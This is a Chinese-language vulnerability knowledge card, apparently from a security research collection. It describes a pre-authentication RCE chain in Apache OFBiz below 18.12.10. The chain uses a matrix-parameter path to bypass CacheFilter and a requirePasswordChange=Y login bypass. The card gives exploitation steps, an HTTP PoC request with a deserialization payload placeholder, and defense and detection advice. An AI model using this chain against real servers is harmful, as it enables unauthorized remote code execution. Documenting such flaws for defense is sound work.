---
id: web-java-component-ofbiz-cachefilter-matrix-uri-xmlrpc-bypass
title: Apache OFBiz CacheFilter 精确 URI 检查绕过：路径矩阵参数 /control/xmlrpc/;/ 躲开 </serializable 安检，叠加 requirePasswordChange=Y 预认证复活 XML-RPC 反序列化
type: scenario
domain: web
path: web/java/component
technique: ofbiz-cachefilter-matrix-uri-authbypass-xmlrpc
aliases:
- OFBiz CacheFilter 绕过
- /control/xmlrpc/;/
- 矩阵参数绕过过滤器
- OFBiz XML-RPC 预认证
- requirePasswordChange 鉴权绕过 XML-RPC
tags:
- java
- ofbiz
- cachefilter
- uri-bypass
- matrix-parameter
- xml-rpc
- deserialization
- auth-bypass
- cve-2023-49070
- cve-2023-51467
cve:
- CVE-2023-49070
- CVE-2023-51467
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
affected_versions: Apache OFBiz < 18.12.10（原文测试 18.12.9；18.12.10 移除 XML-RPC 模块）
verification:
  verified_by: verifier-V616
  verified_at: '2026-11-12T20:52:23+08:00'
  notes: 已通读原文并逐张核对 33 张图片：affected_versions '<18.12.10' 为原文明确写出的影响范围（测试 18.12.9），已保留；CacheFilter#doFilter 对 '/control/xmlrpc'.equals(uri.toLowerCase()) 精确匹配并检查 body 含 '</serializable' 的源码与调试变量 uri='/control/xmlrpc/;/'（图 02）一致；checkLogin 条件与 login() 在 requirePasswordChange=Y 时返回 requirePasswordChange 的分支（图 03-05）一致；修复提交移除 xmlrpc-client/server 依赖（图 06）与 '18.12.10 移除 XML-RPC 模块' 相符；Burp 请求与 XML-RPC fault 响应（图 01）一致。卡片已明确注释原文截图请求行为 /webtools/control/xmlrpc/?...（不含 ;/），'/control/xmlrpc/;/' 写法来自正文分析，该声明诚实。dedup 报告 recommendation=new，related 候选为 49070 XML-RPC 反序列化卡（本卡补充其 CacheFilter/登录绕过前置）、51467 ProgramExport 卡（共用 requirePasswordChange 绕过但利用面不同）、32113 路径解析差异卡，均非同链；dup-scan 无涉及 pair。未验证点：未本机复现；;/ 绕过实际路由行为未在截图中完整展示。
---

## 一句话结论

OFBiz 为阻止 XML-RPC 反序列化在 `CacheFilter#doFilter` 中用 `"/control/xmlrpc".equals(uri.toLowerCase())` 做精确 URI 匹配后检查 body 是否含 `</serializable`；把请求路径写成带矩阵参数的 `/control/xmlrpc/;/` 即可让精确匹配失败、跳过 body 检查而请求仍被 OFBiz 路由到 xmlrpc，再叠加 `USERNAME=&PASSWORD=&requirePasswordChange=Y` 的登录校验绕过（`login()` 返回 `requirePasswordChange` 而非 `error`），即可在打过该过滤补丁的版本上继续投递 XML-RPC 序列化 payload 实现预认证 RCE。

## 原理

- 防护逻辑：`CacheFilter#doFilter` 先取 `requestURI - contextPath` 得到 `uri`，仅当 `"/control/xmlrpc".equals(uri.toLowerCase())` 时才包装请求、读取 body，若 `body.contains("</serializable")` 则记日志并 `return`（不继续过滤链），否则 `chain.doFilter` 放行。这是一个"精确字符串相等"的黑名单检查。
- 绕过点：URI 中的 `;` 是路径矩阵参数（matrix parameter）分隔符，`/control/xmlrpc/;/` 与 `/control/xmlrpc` 字符串不相等，过滤器判断不成立、根本不会读取 body，`</serializable` 检查被跳过；而服务端路由按路径段解析时仍把请求映射到 xmlrpc 控制端点，序列化数据照常进入 XML-RPC 解析/反序列化流程。
- 认证绕过：`LoginWorker.checkLogin` 的条件为 `username == null || (password == null && token == null) || "error".equals(login(request, response))`。`login()` 在用户名为空时会记录错误，但随后 `requirePasswordChange = "Y".equals(request.getParameter("requirePasswordChange"))` 为 true 时返回字符串 `requirePasswordChange` 而不是 `error`；`checkLogin` 只把 `error` 视为失败，条件不成立即按已登录放行，后续请求进入业务处理。
- 两个缺陷叠加：矩阵参数让旧的反序列化安检失效，登录校验缺陷让未认证请求可访问受保护端点，最终 XML-RPC 的序列化入参（ysoserial gadget）在解析阶段触发命令执行，构成完整的预认证 RCE 链。
- 为什么成立：安全判断依赖"URI 字符串完全相等"和"login 返回值等于 error"两个脆弱假设；URL 解析层（矩阵参数、大小写/编码变体）与业务路由层对同一 URI 的解释不一致，是典型的解析差异绕过。

## 触发条件

- Apache OFBiz < 18.12.10（原文实测 18.12.9），`/webtools/control/xmlrpc` 存在且 CacheFilter 已启用；
- classpath 存在可用反序列化 gadget（如 CommonsBeanutils），payload 需用 JDK 11 生成（TemplatesImpl 模块访问限制）；
- 攻击者无需任何凭据。

## 利用步骤

1. 确认目标版本与 `/webtools/control/xmlrpc` 可路由（18.12.10 起该模块被移除，链失效）。
2. 构造 ysoserial（JDK 11 环境）gadget 的 XML-RPC 请求：`<methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct>...<serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">...base64 序列化数据...</serializable></struct></value></param></params></methodCall>`。
3. 将请求路径改为矩阵参数形式 `/webtools/control/xmlrpc/;/`（相对 context 即 `/control/xmlrpc/;/`），使 CacheFilter 的精确匹配失效、跳过 `</serializable` body 检查。
4. URL 追加鉴权绕过参数 `?USERNAME=&PASSWORD=&requirePasswordChange=Y`，POST 发送 XML-RPC 报文。
5. 若响应出现 XML-RPC fault（如 "Failed to read XML-RPC request"）等解析痕迹，说明请求已进入 XML-RPC 处理与反序列化流程；替换 gadget 为命令执行/反弹 shell payload 即可验证 RCE。

## PoC

```http
POST /webtools/control/xmlrpc/;/?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
Host: target:8443
Content-Type: application/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>ProjectDiscovery</methodName>
  <params><param><value><struct>
    <member><name>test</name><value>
      <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
        <BASE64_YSOSERIAL_PAYLOAD>
      </serializable>
    </value></member>
  </struct></value></param></params>
</methodCall>
```

> 原文未在截图中展示 `;/` 的完整请求行（截图请求为 `/webtools/control/xmlrpc/?USERNAME=...`），绕过 URI 写法来自正文分析（相对 context 的 `/control/xmlrpc/;/`）。payload 生成与利用可参考同 CVE 的 ysoserial 公开 PoC。

## 变体与关联

- 变体：任何对 `requestURI` 做精确相等/前后缀判断的过滤器，都可尝试矩阵参数（`;`）、重复斜杠、点段、大小写与 URL 编码等路径解析差异绕过。
- 变体：若过滤器改为 `startsWith` 或规范化后再比较，矩阵参数可能失效，需要换用其它解析差异（如 `%2f`、`//`、`..;/`）。
- 关联：[[web-java-component-ofbiz-cve-2023-49070-xmlrpc-deserialization-preauth-rce]]（同 CVE 的序列化利用与 ysoserial/JDK11 细节，本卡补充其"绕过 CacheFilter 与登录校验"的前置）、[[web-java-component-ofbiz-cve-2023-51467-programexport-auth-bypass-groovy-rce]]（同一 requirePasswordChange=Y 鉴权绕过的另一利用面）、[[web-java-component-ofbiz-cve-2024-32113-controlfilter-traversal-programexport-rce]]（同族路径解析差异绕过）。

## 检测与防御

- 开发/厂商：安全判断不要用原始 URI 字符串精确比较，先做规范化（解码、去除矩阵参数与点段）再匹配；对 XML-RPC 直接禁用/移除模块；登录校验不要把非 `error` 的返回值一律当作成功。
- 审计方：检查所有 Filter 中 `requestURI.equals(...)` 的用法；检查 LoginWorker 中 `login()` 返回值与 `checkLogin` 比较逻辑。
- 检测：WAF/日志关注路径出现 `;` 矩阵参数且目标为 `/control/xmlrpc` 的请求、`requirePasswordChange=Y` 的匿名请求、XML body 中的 `<serializable` 标签。
